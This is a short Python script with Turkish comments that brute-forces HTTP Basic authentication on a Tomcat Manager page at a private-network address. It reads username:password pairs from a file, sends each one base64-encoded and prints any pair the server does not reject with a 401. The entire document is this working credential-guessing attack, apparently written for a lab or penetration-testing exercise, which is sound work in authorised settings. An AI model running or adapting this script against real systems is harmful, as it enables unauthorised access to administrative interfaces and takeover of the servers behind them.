import requests  # HTTP istekleri yapmak için requests modülünü import ediyoruz.
import base64  # Temel 64 kodlama işlemleri için base64 modülünü import ediyoruz.

# Bağlantı kurulacak URL adresini tanımlıyoruz.
url = "http://10.0.2.5:8180/manager/html"

# Kullanıcı adı ve şifrelerin bulunduğu dosyayı açıyoruz.
f = open("user:password.txt", "r")

# Dosyadaki her satır için döngü başlatıyoruz.
for creds in f:
    # Satırı alıp, baştaki ve sondaki boşlukları temizliyoruz.
    creds = creds.strip()
    # Kullanıcı adı ve şifreyi base64 ile encode ediyoruz.
    encoded = base64.b64encode(creds.encode())
    # Base64 encode edilmiş veriyi string'e çeviriyoruz ve Authorization başlığı oluşturuyoruz.
    headers = {'Authorization': 'Basic ' + encoded.decode()}
    # Tanımladığımız URL'e, headers ile birlikte GET isteği gönderiyoruz.
    response = requests.get(url, headers=headers)
    # Eğer HTTP durumu 401 (Unauthorized) değilse, yani başarılı bir giriş olduysa:
    if int(response.status_code) != 401:
        # Başarılı giriş bilgilerini ekrana yazdırıyoruz.
        print(creds)




